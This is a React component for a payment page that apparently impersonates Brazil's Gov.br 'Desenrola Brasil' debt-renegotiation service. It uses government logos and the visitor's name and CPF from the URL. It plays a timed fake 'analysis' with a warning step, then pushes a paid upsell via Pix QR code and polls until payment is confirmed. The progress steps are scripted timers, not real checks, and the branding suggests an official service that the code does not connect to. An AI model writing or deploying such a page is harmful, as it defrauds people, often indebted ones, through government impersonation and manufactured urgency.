import { useServerFn } from "@tanstack/react-start";
import { QRCodeCanvas } from "qrcode.react";
import { useCallback, useEffect, useRef, useState } from "react";

import govLogo from "@/assets/iconegov.png.asset.json";
import footerLogo from "@/assets/iconefooter.png.asset.json";
import limpeNome from "@/assets/limpenome.png.asset.json";
import { checkPixPayment, createPixPayment } from "@/lib/payment.functions";
import type { UpsellConfig } from "@/lib/upsell-config";

const money = (v: number) => v.toLocaleString("pt-BR", { style: "currency", currency: "BRL" });

function formatCPF(cpf: string) {
  const clean = cpf.replace(/\D/g, "").slice(0, 11);
  if (clean.length !== 11) return cpf;
  return clean.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, "$1.$2.$3-$4");
}

function readParams() {
  const p = new URLSearchParams(window.location.search);
  const name = p.get("name") || "USUARIO345";
  const document = (p.get("document") || "06562983169").replace(/\D/g, "");
  return {
    customer: {
      name,
      document,
      email: p.get("email") || "user@desenrolabrasil.com",
      phone: (p.get("phone") || "11999999999").replace(/\D/g, ""),
    },
    tracking: {
      src: p.get("src"),
      sck: p.get("sck"),
      utm_source: p.get("utm_source"),
      utm_medium: p.get("utm_medium"),
      utm_campaign: p.get("utm_campaign"),
      utm_term: p.get("utm_term"),
      utm_content: p.get("utm_content"),
    },
    search: window.location.search,
  };
}

type Ctx = ReturnType<typeof readParams>;

export type UpsellCopy = {
  headline: React.ReactNode;
  startLabel: string;
  steps: [string, string, string, string];
  offer: React.ReactNode;
  payLabel: string;
  footerNote: React.ReactNode;
};

export function UpsellPage({ config, copy }: { config: UpsellConfig; copy: UpsellCopy }) {
  const [ctx, setCtx] = useState<Ctx | null>(null);
  const [phase, setPhase] = useState<"start" | "loading" | "offer">("start");
  const [step, setStep] = useState(0);
  const [progress, setProgress] = useState(0);
  const [pix, setPix] = useState<{ code: string; id: string; createdAt: string } | null>(null);
  const [status, setStatus] = useState<"idle" | "generating" | "pending" | "paid" | "expired" | "error">("idle");
  const [copied, setCopied] = useState(false);
  const pollRef = useRef<ReturnType<typeof setInterval> | null>(null);
  const doneRef = useRef(false);

  const createPix = useServerFn(createPixPayment);
  const checkPix = useServerFn(checkPixPayment);

  useEffect(() => setCtx(readParams()), []);

  const goToNext = useCallback(
    (search: string) => {
      const params = new URLSearchParams(search);
      if (config.nextUrl.startsWith("/")) {
        const qs = params.toString();
        window.location.href = qs ? `${config.nextUrl}?${qs}` : config.nextUrl;
        return;
      }
      const url = new URL(config.nextUrl);
      params.forEach((value, key) => url.searchParams.set(key, value));
      window.location.href = url.toString();
    },
    [config.nextUrl],
  );

  const verify = useCallback(
    async (current: { id: string; createdAt: string }, c: Ctx) => {
      if (doneRef.current) return "paid" as const;
      const result = await checkPix({
        data: {
          upsell: config.id,
          transactionId: current.id,
          createdAt: current.createdAt,
          customer: c.customer,
          tracking: c.tracking,
        },
      });
      if (result.state === "paid") {
        doneRef.current = true;
        if (pollRef.current) clearInterval(pollRef.current);
        setStatus("paid");
        setTimeout(() => goToNext(c.search), 1500);
      } else if (result.state === "expired") {
        if (pollRef.current) clearInterval(pollRef.current);
        setStatus("expired");
      }
      return result.state;
    },
    [checkPix, goToNext, config.id],
  );

  useEffect(() => {
    if (!pix || !ctx || status !== "pending") return;
    pollRef.current = setInterval(() => {
      void verify({ id: pix.id, createdAt: pix.createdAt }, ctx).catch(() => {});
    }, 5000);
    return () => {
      if (pollRef.current) clearInterval(pollRef.current);
    };
  }, [pix, ctx, status, verify]);

  function startAnalysis() {
    setPhase("loading");
    setProgress(40);
    setTimeout(() => {
      setProgress(80);
      setStep(1);
    }, 2500);
    setTimeout(() => {
      setProgress(100);
      setStep(2);
    }, 5000);
    setTimeout(() => {
      setStep(3);
      setPhase("offer");
    }, 7000);
  }

  async function handleCheckout() {
    if (!ctx) return;
    setStatus("generating");
    try {
      const result = await createPix({
        data: {
          upsell: config.id,
          customer: ctx.customer,
          tracking: ctx.tracking,
          sourceUrl: window.location.href,
        },
      });
      doneRef.current = false;
      setPix({ id: result.transactionId, code: result.pixCode, createdAt: result.createdAt });
      setStatus("pending");
    } catch (e) {
      console.error(e);
      setStatus("error");
    }
  }

  async function handleManualCheck() {
    if (!pix || !ctx) return;
    const state = await verify({ id: pix.id, createdAt: pix.createdAt }, ctx).catch(() => "error");
    if (state === "pending") setCopied(false);
  }

  function copyPix() {
    if (!pix) return;
    void navigator.clipboard.writeText(pix.code).then(() => {
      setCopied(true);
      setTimeout(() => setCopied(false), 2500);
    });
  }

  return (
    <div className="flex min-h-screen flex-col bg-gov-bg font-sans">
      <header className="flex items-center justify-between bg-card px-6 py-3 shadow-sm">
        <img src={govLogo.url} alt="Gov.br" className="h-8 w-auto" />
        <div className="text-right leading-tight">
          <strong className="block text-sm text-foreground">{ctx?.customer.name ?? "Nome"}</strong>
          <span className="text-xs text-muted-foreground">
            {ctx ? formatCPF(ctx.customer.document) : "CPF"}
          </span>
        </div>
      </header>

      <main className="flex flex-1 items-center justify-center px-4 py-8">
        <div className="w-full max-w-[560px] rounded-xl bg-card p-6 shadow-lg sm:p-10">
          <div className="mb-6 flex justify-center">
            <img src={limpeNome.url} alt="Limpe seu Nome e Desenrola, Brasil!" className="h-14 w-auto object-contain" />
          </div>

          <h1 className="mb-6 text-center text-sm leading-snug font-medium text-foreground">{copy.headline}</h1>

          {phase === "start" && (
            <button
              onClick={startAnalysis}
              className="w-full rounded-full bg-gov-blue px-4 py-3.5 text-base font-bold text-gov-on-blue transition-colors hover:bg-gov-dark"
            >
              {copy.startLabel}
            </button>
          )}

          {phase !== "start" && (
            <div className="mt-4">
              <div className="mb-6 h-1.5 w-full overflow-hidden rounded-full bg-muted">
                <div
                  className="h-full rounded-full bg-gov-blue transition-all duration-500"
                  style={{ width: `${progress}%` }}
                />
              </div>
              {step === 0 && <Loading text={copy.steps[0]} />}
              {step === 1 && <Loading text={copy.steps[1]} />}
              {step === 2 && <p className="mb-4 text-sm font-bold text-gov-warning">⚠ {copy.steps[2]}</p>}
              {step === 3 && <p className="mb-4 text-sm font-bold text-gov-green">✅ {copy.steps[3]}</p>}
            </div>
          )}

          {phase === "offer" && (
            <div className="mt-6">
              <div className="mb-5 rounded-r-md border-l-4 border-gov-red bg-gov-red-soft p-4">
                <p className="text-sm leading-relaxed text-foreground">{copy.offer}</p>
              </div>

              <p className="mb-4 text-center text-sm text-muted-foreground">
                <b>{config.productName}</b> — <b className="text-gov-green">{money(config.amount)}</b>
              </p>

              {!pix && (
                <button
                  onClick={handleCheckout}
                  disabled={status === "generating"}
                  className="w-full rounded-full bg-gov-dark px-4 py-3.5 text-base font-bold text-gov-on-blue transition-colors hover:bg-gov-blue disabled:opacity-60"
                >
                  {status === "generating" ? "Gerando Pix..." : copy.payLabel}
                </button>
              )}

              {status === "error" && !pix && (
                <p className="mt-3 text-center text-sm font-medium text-gov-red">
                  Falha ao gerar o Pix. Tente novamente.
                </p>
              )}

              {pix && (
                <div className="mt-6 rounded-lg border border-border bg-gov-bg p-4">
                  <div className="mb-3 flex justify-center">
                    <div className="rounded bg-card p-2">
                      <QRCodeCanvas value={pix.code} size={192} level="H" />
                    </div>
                  </div>
                  <div className="flex items-center justify-between gap-2 rounded border border-border bg-card p-2">
                    <span className="truncate font-mono text-sm text-muted-foreground">{pix.code}</span>
                    <button onClick={copyPix} className="text-sm font-medium text-gov-blue hover:text-gov-dark">
                      {copied ? "Copiado!" : "Copiar"}
                    </button>
                  </div>
                  <p className="mt-2 text-center text-xs text-muted-foreground">
                    Escaneie o QR Code ou copie o código para pagar via Pix
                  </p>

                  {status === "pending" && (
                    <>
                      <button
                        onClick={handleManualCheck}
                        className="mt-3 w-full rounded-full bg-gov-green px-4 py-2 text-sm font-bold text-gov-on-blue transition-colors hover:opacity-90"
                      >
                        Já paguei, verificar
                      </button>
                      <p className="mt-2 text-center text-sm text-gov-warning">
                        Aguardando pagamento... verificando automaticamente.
                      </p>
                    </>
                  )}

                  {status === "paid" && (
                    <p className="mt-3 text-center text-sm font-bold text-gov-green">
                      ✅ Pagamento confirmado! Redirecionando...
                    </p>
                  )}

                  {status === "expired" && (
                    <>
                      <p className="mt-3 text-center text-sm font-bold text-gov-red">⏰ O Pix expirou.</p>
                      <button
                        onClick={handleCheckout}
                        className="mt-2 w-full rounded-full bg-gov-blue px-4 py-2 text-sm font-bold text-gov-on-blue"
                      >
                        Gerar novo Pix
                      </button>
                    </>
                  )}
                </div>
              )}
            </div>
          )}

          <div className="mt-8 rounded-r-md border-l-4 border-gov-blue bg-gov-light-blue p-4">
            <p className="text-sm leading-relaxed text-foreground">{copy.footerNote}</p>
          </div>
        </div>
      </main>

      <footer className="border-t-4 border-gov-yellow bg-gov-dark px-4 py-6 text-center text-gov-on-blue">
        <img src={footerLogo.url} alt="Gov.br" className="mx-auto mb-3 h-6 opacity-90" />
        <p className="text-[11px] opacity-70">Sistema de Renegociação — Todos os direitos reservados</p>
      </footer>
    </div>
  );
}

function Loading({ text }: { text: string }) {
  return (
    <div className="mb-4 flex items-center gap-3">
      <div className="h-5 w-5 shrink-0 animate-spin rounded-full border-2 border-gov-blue border-t-transparent" />
      <span className="text-sm text-muted-foreground">{text}</span>
    </div>
  );
}
